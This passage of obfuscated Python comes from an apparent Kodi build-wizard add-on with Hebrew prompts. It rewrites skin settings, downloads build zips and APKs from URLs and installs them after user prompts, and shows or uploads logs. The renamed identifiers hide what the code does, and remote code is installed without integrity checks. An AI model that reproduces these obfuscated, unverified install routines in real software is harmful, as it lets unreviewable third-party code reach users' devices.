			OO00000O00O0000OO .write (OO0000O0O0OO00O00 .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OO000O000OOOOOOO0 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:4248
			OO00000O00O0000OO .close ()#line:4249
			O0OOO000OO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4253
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'r')#line:4255
			OO0000O0O0OO00O00 =OO00000O00O0000OO .read ()#line:4256
			OO00000O00O0000OO .close ()#line:4257
			O000OOO00O000OO00 ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:4258
			OO000O000OOOOOOO0 =re .compile (O000OOO00O000OO00 ).findall (OO0000O0O0OO00O00 )[0 ]#line:4259
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'w')#line:4260
			OO00000O00O0000OO .write (OO0000O0O0OO00O00 .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OO000O000OOOOOOO0 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:4261
			OO00000O00O0000OO .close ()#line:4262
			O0OOO000OO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4266
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'r')#line:4268
			OO0000O0O0OO00O00 =OO00000O00O0000OO .read ()#line:4269
			OO00000O00O0000OO .close ()#line:4270
			O000OOO00O000OO00 ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4271
			OO000O000OOOOOOO0 =re .compile (O000OOO00O000OO00 ).findall (OO0000O0O0OO00O00 )[0 ]#line:4272
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'w')#line:4273
			OO00000O00O0000OO .write (OO0000O0O0OO00O00 .replace ('<setting id="show.cdart" type="bool%s/setting>'%OO000O000OOOOOOO0 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4274
			OO00000O00O0000OO .close ()#line:4275
			O0OOO000OO0OO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4279
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'r')#line:4281
			OO0000O0O0OO00O00 =OO00000O00O0000OO .read ()#line:4282
			OO00000O00O0000OO .close ()#line:4283
			O000OOO00O000OO00 ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4284
			OO000O000OOOOOOO0 =re .compile (O000OOO00O000OO00 ).findall (OO0000O0O0OO00O00 )[0 ]#line:4285
			OO00000O00O0000OO =open (O0OOO000OO0OO0O0O ,'w')#line:4286
			OO00000O00O0000OO .write (OO0000O0O0OO00O00 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OO000O000OOOOOOO0 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4287
			OO00000O00O0000OO .close ()#line:4288
		except :#line:4293
			pass #line:4294
def thirdPartyInstall (OOOOOO0O000OO00OO ,O0O0O0O0OOOO0O00O ):#line:4296
	if not wiz .workingURL (O0O0O0O0OOOO0O00O ):#line:4297
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4298
	OOO00O000OOO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOO0O000OO00OO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4299
	if OOO00O000OOO00O0O ==1 :#line:4300
		freshStart ('third',True )#line:4301
	wiz .clearS ('build')#line:4302
	O0000000OOO0OO0O0 =OOOOOO0O000OO00OO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4303
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4304
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0O000OO00OO ),'','אנא המתן')#line:4305
	O0OO0OOOO000000O0 =os .path .join (PACKAGES ,'%s.zip'%O0000000OOO0OO0O0 )#line:4306
	try :os .remove (O0OO0OOOO000000O0 )#line:4307
	except :pass #line:4308
	downloader .download (O0O0O0O0OOOO0O00O ,O0OO0OOOO000000O0 ,DP )#line:4309
	xbmc .sleep (1000 )#line:4310
	O00O00OO0OO000O0O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0O000OO00OO )#line:4311
	DP .update (0 ,O00O00OO0OO000O0O ,'','אנא המתן')#line:4312
	OO0000OOO00O0O000 ,OO0O00OOOO0000O00 ,OOO0O00OOO00000OO =extract .all (O0OO0OOOO000000O0 ,HOME ,DP ,title =O00O00OO0OO000O0O )#line:4313
	if int (float (OO0000OOO00O0O000 ))>0 :#line:4314
		wiz .fixmetas ()#line:4315
		wiz .lookandFeelData ('save')#line:4316
		wiz .defaultSkin ()#line:4317
		wiz .setS ('installed','true')#line:4319
		wiz .setS ('extract',str (OO0000OOO00O0O000 ))#line:4320
		wiz .setS ('errors',str (OO0O00OOOO0000O00 ))#line:4321
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(OO0000OOO00O0O000 ,OO0O00OOOO0000O00 ))#line:4322
		try :os .remove (O0OO0OOOO000000O0 )#line:4323
		except :pass #line:4324
		if int (float (OO0O00OOOO0000O00 ))>0 :#line:4325
			O0O00OOOO00OO0O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOOOOO0O000OO00OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,OO0000OOO00O0O000 ,'%',COLOR1 ,OO0O00OOOO0000O00 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4326
			if O0O00OOOO00OO0O0O :#line:4327
				if isinstance (OO0O00OOOO0000O00 ,unicode ):#line:4328
					OOO0O00OOO00000OO =OOO0O00OOO00000OO .encode ('utf-8')#line:4329
				wiz .TextBox (ADDONTITLE ,OOO0O00OOO00000OO )#line:4330
	DP .close ()#line:4331
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4332
	if INSTALLMETHOD ==1 :O00000000O0O0OOOO =1 #line:4333
	elif INSTALLMETHOD ==2 :O00000000O0O0OOOO =0 #line:4334
	else :O00000000O0O0OOOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4335
	if O00000000O0O0OOOO ==1 :wiz .reloadFix ()#line:4336
	else :wiz .killxbmc (True )#line:4337
def testTheme (OO0OOO0OO00OOOOOO ):#line:4339
	O0OO0O0OO00O00O00 =zipfile .ZipFile (OO0OOO0OO00OOOOOO )#line:4340
	for O0O000O0O00O0O00O in O0OO0O0OO00O00O00 .infolist ():#line:4341
		if '/settings.xml'in O0O000O0O00O0O00O .filename :#line:4342
			return True #line:4343
	return False #line:4344
def testGui (O0OOOO0OO0O0OOO0O ):#line:4346
	O00OOOOO00O0OO0OO =zipfile .ZipFile (O0OOOO0OO0O0OOO0O )#line:4347
	for OOOO00000000OO00O in O00OOOOO00O0OO0OO .infolist ():#line:4348
		if '/guisettings.xml'in OOOO00000000OO00O .filename :#line:4349
			return True #line:4350
	return False #line:4351
def apkInstaller (OOOOOO0O000O0O000 ,O00OO00O0O00O000O ):#line:4353
	wiz .log (OOOOOO0O000O0O000 )#line:4354
	wiz .log (O00OO00O0O00O000O )#line:4355
	if wiz .platform ()=='android':#line:4356
		OO000O000OO00000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOOOO0O000O0O000 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4357
		if not OO000O000OO00000O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4358
		OO0000O0O0OOOO000 =OOOOOO0O000O0O000 #line:4359
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4360
		if not wiz .workingURL (O00OO00O0O00O000O )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4361
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0000O0O0OOOO000 ),'','אנא המתן')#line:4362
		O0O0OO0O0000O0000 =os .path .join (PACKAGES ,"%s.apk"%OOOOOO0O000O0O000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4363
		try :os .remove (O0O0OO0O0000O0000 )#line:4364
		except :pass #line:4365
		downloader .download (O00OO00O0O00O000O ,O0O0OO0O0000O0000 ,DP )#line:4366
		xbmc .sleep (100 )#line:4367
		DP .close ()#line:4368
		notify .apkInstaller (OOOOOO0O000O0O000 )#line:4369
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0O0OO0O0000O0000 +'")')#line:4370
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4371
def createMenu (O0O00O000O0O0O000 ,OO0O00000000O000O ,O0O00O00OOO000000 ):#line:4377
	if O0O00O000O0O0O000 =='saveaddon':#line:4378
		O0O0OO0000OO00O00 =[]#line:4379
		OOOOO0000OOO0O000 =urllib .quote_plus (OO0O00000000O000O .lower ().replace (' ',''))#line:4380
		OOOOO0O0OOO0OOO0O =OO0O00000000O000O .replace ('Debrid','Real Debrid')#line:4381
		OO0O00O00O000OO0O =urllib .quote_plus (O0O00O00OOO000000 .lower ().replace (' ',''))#line:4382
		O0O00O00OOO000000 =O0O00O00OOO000000 .replace ('url','URL Resolver')#line:4383
		O0O0OO0000OO00O00 .append ((THEME2 %O0O00O00OOO000000 .title (),' '))#line:4384
		O0O0OO0000OO00O00 .append ((THEME3 %'Save %s Data'%OOOOO0O0OOO0OOO0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOOO0000OOO0O000 ,OO0O00O00O000OO0O )))#line:4385
		O0O0OO0000OO00O00 .append ((THEME3 %'Restore %s Data'%OOOOO0O0OOO0OOO0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOOO0000OOO0O000 ,OO0O00O00O000OO0O )))#line:4386
		O0O0OO0000OO00O00 .append ((THEME3 %'Clear %s Data'%OOOOO0O0OOO0OOO0O ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,OOOOO0000OOO0O000 ,OO0O00O00O000OO0O )))#line:4387
	elif O0O00O000O0O0O000 =='save':#line:4388
		O0O0OO0000OO00O00 =[]#line:4389
		OOOOO0000OOO0O000 =urllib .quote_plus (OO0O00000000O000O .lower ().replace (' ',''))#line:4390
		OOOOO0O0OOO0OOO0O =OO0O00000000O000O .replace ('Debrid','Real Debrid')#line:4391
		OO0O00O00O000OO0O =urllib .quote_plus (O0O00O00OOO000000 .lower ().replace (' ',''))#line:4392
		O0O00O00OOO000000 =O0O00O00OOO000000 .replace ('url','URL Resolver')#line:4393
		O0O0OO0000OO00O00 .append ((THEME2 %O0O00O00OOO000000 .title (),' '))#line:4394
		O0O0OO0000OO00O00 .append ((THEME3 %'Register %s'%OOOOO0O0OOO0OOO0O ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,OOOOO0000OOO0O000 ,OO0O00O00O000OO0O )))#line:4395
		O0O0OO0000OO00O00 .append ((THEME3 %'Save %s Data'%OOOOO0O0OOO0OOO0O ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,OOOOO0000OOO0O000 ,OO0O00O00O000OO0O )))#line:4396
		O0O0OO0000OO00O00 .append ((THEME3 %'Restore %s Data'%OOOOO0O0OOO0OOO0O ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,OOOOO0000OOO0O000 ,OO0O00O00O000OO0O )))#line:4397
		O0O0OO0000OO00O00 .append ((THEME3 %'Import %s Data'%OOOOO0O0OOO0OOO0O ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,OOOOO0000OOO0O000 ,OO0O00O00O000OO0O )))#line:4398
		O0O0OO0000OO00O00 .append ((THEME3 %'Clear Addon %s Data'%OOOOO0O0OOO0OOO0O ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,OOOOO0000OOO0O000 ,OO0O00O00O000OO0O )))#line:4399
	elif O0O00O000O0O0O000 =='install':#line:4400
		O0O0OO0000OO00O00 =[]#line:4401
		OO0O00O00O000OO0O =urllib .quote_plus (O0O00O00OOO000000 )#line:4402
		O0O0OO0000OO00O00 .append ((THEME2 %O0O00O00OOO000000 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OO0O00O00O000OO0O )))#line:4403
		O0O0OO0000OO00O00 .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OO0O00O00O000OO0O )))#line:4404
		O0O0OO0000OO00O00 .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OO0O00O00O000OO0O )))#line:4405
		O0O0OO0000OO00O00 .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OO0O00O00O000OO0O )))#line:4406
		O0O0OO0000OO00O00 .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OO0O00O00O000OO0O )))#line:4407
	O0O0OO0000OO00O00 .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4408
	return O0O0OO0000OO00O00 #line:4409
def toggleCache (OO0OO0O000O00OO00 ):#line:4411
	OOO0O000O000OOOOO =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4412
	OO0O000OOOO0OOOOO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4413
	if OO0OO0O000O00OO00 in ['true','false']:#line:4414
		for OO0000OOO0OO000OO in OOO0O000O000OOOOO :#line:4415
			wiz .setS (OO0000OOO0OO000OO ,OO0OO0O000O00OO00 )#line:4416
	else :#line:4417
		if not OO0OO0O000O00OO00 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4418
			try :#line:4419
				OO0000OOO0OO000OO =OO0O000OOOO0OOOOO [OOO0O000O000OOOOO .index (OO0OO0O000O00OO00 )]#line:4420
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0000OOO0OO000OO ))#line:4421
			except :#line:4422
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0OO0O000O00OO00 ))#line:4423
		else :#line:4424
			OO00000OOO000O000 ='true'if wiz .getS (OO0OO0O000O00OO00 )=='false'else 'false'#line:4425
			wiz .setS (OO0OO0O000O00OO00 ,OO00000OOO000O000 )#line:4426
def playVideo (OOOO00O0OO0OO0000 ):#line:4428
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OOOO00O0OO0OO0000 )#line:4429
	if 'watch?v='in OOOO00O0OO0OO0000 :#line:4430
		OO0O0000O0OO0000O ,OOO0OOOOOO0OOOO00 =OOOO00O0OO0OO0000 .split ('?')#line:4431
		OOO0OO0O00O000O00 =OOO0OOOOOO0OOOO00 .split ('&')#line:4432
		for OO0000OO0OOOO0000 in OOO0OO0O00O000O00 :#line:4433
			if OO0000OO0OOOO0000 .startswith ('v='):#line:4434
				OOOO00O0OO0OO0000 =OO0000OO0OOOO0000 [2 :]#line:4435
				break #line:4436
			else :continue #line:4437
	elif 'embed'in OOOO00O0OO0OO0000 or 'youtu.be'in OOOO00O0OO0OO0000 :#line:4438
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OOOO00O0OO0OO0000 )#line:4439
		OO0O0000O0OO0000O =OOOO00O0OO0OO0000 .split ('/')#line:4440
		if len (OO0O0000O0OO0000O [-1 ])>5 :#line:4441
			OOOO00O0OO0OO0000 =OO0O0000O0OO0000O [-1 ]#line:4442
		elif len (OO0O0000O0OO0000O [-2 ])>5 :#line:4443
			OOOO00O0OO0OO0000 =OO0O0000O0OO0000O [-2 ]#line:4444
	wiz .log ("YouTube URL: %s"%OOOO00O0OO0OO0000 )#line:4445
	yt .PlayVideo (OOOO00O0OO0OO0000 )#line:4446
def viewLogFile ():#line:4448
	O0O00000O000OO00O =wiz .Grab_Log (True )#line:4449
	O0O00O000OO0000OO =wiz .Grab_Log (True ,True )#line:4450
	OOOOOO0OO0OO00OOO =0 ;O0O00O000O0O000O0 =O0O00000O000OO00O #line:4451
	if not O0O00O000OO0000OO ==False and not O0O00000O000OO00O ==False :#line:4452
		OOOOOO0OO0OO00OOO =DIALOG .select (ADDONTITLE ,["View %s"%O0O00000O000OO00O .replace (LOG ,""),"View %s"%O0O00O000OO0000OO .replace (LOG ,"")])#line:4453
		if OOOOOO0OO0OO00OOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4454
	elif O0O00000O000OO00O ==False and O0O00O000OO0000OO ==False :#line:4455
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4456
		return #line:4457
	elif not O0O00000O000OO00O ==False :OOOOOO0OO0OO00OOO =0 #line:4458
	elif not O0O00O000OO0000OO ==False :OOOOOO0OO0OO00OOO =1 #line:4459
	O0O00O000O0O000O0 =O0O00000O000OO00O if OOOOOO0OO0OO00OOO ==0 else O0O00O000OO0000OO #line:4461
	OO0O00OOO0O0000O0 =wiz .Grab_Log (False )if OOOOOO0OO0OO00OOO ==0 else wiz .Grab_Log (False ,True )#line:4462
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,O0O00O000O0O000O0 ),OO0O00OOO0O0000O0 )#line:4464
def errorChecking (log =None ,count =None ,all =None ):#line:4466
	if log ==None :#line:4467
		OO00OO0O00O00O0OO =wiz .Grab_Log (True )#line:4468
		OOOO0OO00O00000O0 =wiz .Grab_Log (True ,True )#line:4469
		if not OOOO0OO00O00000O0 ==False and not OO00OO0O00O00O0OO ==False :#line:4470
			O0OO00O0OO0O0OOOO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO00OO0O00O00O0OO .replace (LOG ,""),errorChecking (OO00OO0O00O00O0OO ,True ,True )),"View %s: %s error(s)"%(OOOO0OO00O00000O0 .replace (LOG ,""),errorChecking (OOOO0OO00O00000O0 ,True ,True ))])#line:4471
			if O0OO00O0OO0O0OOOO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4472
		elif OO00OO0O00O00O0OO ==False and OOOO0OO00O00000O0 ==False :#line:4473
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4474
			return #line:4475
		elif not OO00OO0O00O00O0OO ==False :O0OO00O0OO0O0OOOO =0 #line:4476
		elif not OOOO0OO00O00000O0 ==False :O0OO00O0OO0O0OOOO =1 #line:4477
		log =OO00OO0O00O00O0OO if O0OO00O0OO0O0OOOO ==0 else OOOO0OO00O00000O0 #line:4478
	if log ==False :#line:4479
		if count ==None :#line:4480
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4481
			return False #line:4482
		else :#line:4483
			return 0 #line:4484
	else :#line:4485
		if os .path .exists (log ):#line:4486
			OO000OOOO00OO0OOO =open (log ,mode ='r');OO00OO0O0OOOO0OOO =OO000OOOO00OO0OOO .read ().replace ('\n','').replace ('\r','');OO000OOOO00OO0OOO .close ()#line:4487
			OOO000OOOO00O0000 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OO00OO0O0OOOO0OOO )#line:4488
			if not count ==None :#line:4489
				if all ==None :#line:4490
					OOOO0OO00O00O0OO0 =0 #line:4491
					for OO0000O0O0O0OO0OO in OOO000OOOO00O0000 :#line:4492
						if ADDON_ID in OO0000O0O0O0OO0OO :OOOO0OO00O00O0OO0 +=1 #line:4493
					return OOOO0OO00O00O0OO0 #line:4494
				else :return len (OOO000OOOO00O0000 )#line:4495
			if len (OOO000OOOO00O0000 )>0 :#line:4496
				OOOO0OO00O00O0OO0 =0 ;OOO0O00OO0000O00O =""#line:4497
				for OO0000O0O0O0OO0OO in OOO000OOOO00O0000 :#line:4498
					if all ==None and not ADDON_ID in OO0000O0O0O0OO0OO :continue #line:4499
					else :#line:4500
						OOOO0OO00O00O0OO0 +=1 #line:4501
						OOO0O00OO0000O00O +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOOO0OO00O00O0OO0 ,OO0000O0O0O0OO0OO .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4502
				if OOOO0OO00O00O0OO0 >0 :#line:4503
					wiz .TextBox (ADDONTITLE ,OOO0O00OO0000O00O )#line:4504
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4505
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4506
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4507
ACTION_PREVIOUS_MENU =10 #line:4509
ACTION_NAV_BACK =92 #line:4510
ACTION_MOVE_LEFT =1 #line:4511
ACTION_MOVE_RIGHT =2 #line:4512
ACTION_MOVE_UP =3 #line:4513
ACTION_MOVE_DOWN =4 #line:4514
ACTION_MOUSE_WHEEL_UP =104 #line:4515
ACTION_MOUSE_WHEEL_DOWN =105 #line:4516
ACTION_MOVE_MOUSE =107 #line:4517
ACTION_SELECT_ITEM =7 #line:4518
ACTION_BACKSPACE =110 #line:4519
ACTION_MOUSE_LEFT_CLICK =100 #line:4520
ACTION_MOUSE_LONG_CLICK =108 #line:4521
def LogViewer (default =None ):#line:4523
	class OO0000000O0OOO0O0 (xbmcgui .WindowXMLDialog ):#line:4524
		def __init__ (OO0O0O00OOOO00O0O ,*OOOO00O0O000O00OO ,**OOOOOO0OOOO00O000 ):#line:4525
			OO0O0O00OOOO00O0O .default =OOOOOO0OOOO00O000 ['default']#line:4526
		def onInit (OO00OOOO00O0OO0OO ):#line:4528
			OO00OOOO00O0OO0OO .title =101 #line:4529
			OO00OOOO00O0OO0OO .msg =102 #line:4530
			OO00OOOO00O0OO0OO .scrollbar =103 #line:4531
			OO00OOOO00O0OO0OO .upload =201 #line:4532
			OO00OOOO00O0OO0OO .kodi =202 #line:4533
			OO00OOOO00O0OO0OO .kodiold =203 #line:4534
			OO00OOOO00O0OO0OO .wizard =204 #line:4535
			OO00OOOO00O0OO0OO .okbutton =205 #line:4536
			OOOOO0O000O0O0OOO =open (OO00OOOO00O0OO0OO .default ,'r')#line:4537
			OO00OOOO00O0OO0OO .logmsg =OOOOO0O000O0O0OOO .read ()#line:4538
			OOOOO0O000O0O0OOO .close ()#line:4539
			OO00OOOO00O0OO0OO .titlemsg ="%s: %s"%(ADDONTITLE ,OO00OOOO00O0OO0OO .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4540
			OO00OOOO00O0OO0OO .showdialog ()#line:4541
		def showdialog (OOO00OO0O00000OOO ):#line:4543
			OOO00OO0O00000OOO .getControl (OOO00OO0O00000OOO .title ).setLabel (OOO00OO0O00000OOO .titlemsg )#line:4544
			OOO00OO0O00000OOO .getControl (OOO00OO0O00000OOO .msg ).setText (wiz .highlightText (OOO00OO0O00000OOO .logmsg ))#line:4545
			OOO00OO0O00000OOO .setFocusId (OOO00OO0O00000OOO .scrollbar )#line:4546
		def onClick (OOOOO000O00O0OOOO ,O0OO0OO0O0O0O0OO0 ):#line:4548
			if O0OO0OO0O0O0O0OO0 ==OOOOO000O00O0OOOO .okbutton :OOOOO000O00O0OOOO .close ()#line:4549
			elif O0OO0OO0O0O0O0OO0 ==OOOOO000O00O0OOOO .upload :OOOOO000O00O0OOOO .close ();uploadLog .Main ()#line:4550
			elif O0OO0OO0O0O0O0OO0 ==OOOOO000O00O0OOOO .kodi :#line:4551
				O0000OOOOO00000OO =wiz .Grab_Log (False )#line:4552
				O0O0O000000OOOO0O =wiz .Grab_Log (True )#line:4553
				if O0000OOOOO00000OO ==False :#line:4554
					OOOOO000O00O0OOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4555
					OOOOO000O00O0OOOO .getControl (OOOOO000O00O0OOOO .msg ).setText ("Log File Does Not Exists!")#line:4556
				else :#line:4557
					OOOOO000O00O0OOOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O000000OOOO0O .replace (LOG ,''))#line:4558
					OOOOO000O00O0OOOO .getControl (OOOOO000O00O0OOOO .title ).setLabel (OOOOO000O00O0OOOO .titlemsg )#line:4559
					OOOOO000O00O0OOOO .getControl (OOOOO000O00O0OOOO .msg ).setText (wiz .highlightText (O0000OOOOO00000OO ))#line:4560
					OOOOO000O00O0OOOO .setFocusId (OOOOO000O00O0OOOO .scrollbar )#line:4561
			elif O0OO0OO0O0O0O0OO0 ==OOOOO000O00O0OOOO .kodiold :#line:4562
				O0000OOOOO00000OO =wiz .Grab_Log (False ,True )#line:4563
				O0O0O000000OOOO0O =wiz .Grab_Log (True ,True )#line:4564
				if O0000OOOOO00000OO ==False :#line:4565
					OOOOO000O00O0OOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4566
					OOOOO000O00O0OOOO .getControl (OOOOO000O00O0OOOO .msg ).setText ("Log File Does Not Exists!")#line:4567
				else :#line:4568
					OOOOO000O00O0OOOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O000000OOOO0O .replace (LOG ,''))#line:4569
					OOOOO000O00O0OOOO .getControl (OOOOO000O00O0OOOO .title ).setLabel (OOOOO000O00O0OOOO .titlemsg )#line:4570
					OOOOO000O00O0OOOO .getControl (OOOOO000O00O0OOOO .msg ).setText (wiz .highlightText (O0000OOOOO00000OO ))#line:4571
					OOOOO000O00O0OOOO .setFocusId (OOOOO000O00O0OOOO .scrollbar )#line:4572
			elif O0OO0OO0O0O0O0OO0 ==OOOOO000O00O0OOOO .wizard :#line:4573
				O0000OOOOO00000OO =wiz .Grab_Log (False ,False ,True )#line:4574
				O0O0O000000OOOO0O =wiz .Grab_Log (True ,False ,True )#line:4575
				if O0000OOOOO00000OO ==False :#line:4576
					OOOOO000O00O0OOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4577
					OOOOO000O00O0OOOO .getControl (OOOOO000O00O0OOOO .msg ).setText ("Log File Does Not Exists!")#line:4578
				else :#line:4579
					OOOOO000O00O0OOOO .titlemsg ="%s: %s"%(ADDONTITLE ,O0O0O000000OOOO0O .replace (ADDONDATA ,''))#line:4580
					OOOOO000O00O0OOOO .getControl (OOOOO000O00O0OOOO .title ).setLabel (OOOOO000O00O0OOOO .titlemsg )#line:4581
					OOOOO000O00O0OOOO .getControl (OOOOO000O00O0OOOO .msg ).setText (wiz .highlightText (O0000OOOOO00000OO ))#line:4582
					OOOOO000O00O0OOOO .setFocusId (OOOOO000O00O0OOOO .scrollbar )#line:4583
		def onAction (OOO0OOOO00O0000OO ,O000OO0OO0OOOO0OO ):#line:4585
			if O000OO0OO0OOOO0OO ==ACTION_PREVIOUS_MENU :OOO0OOOO00O0000OO .close ()#line:4586
			elif O000OO0OO0OOOO0OO ==ACTION_NAV_BACK :OOO0OOOO00O0000OO .close ()#line:4587
	if default ==None :default =wiz .Grab_Log (True )#line:4588
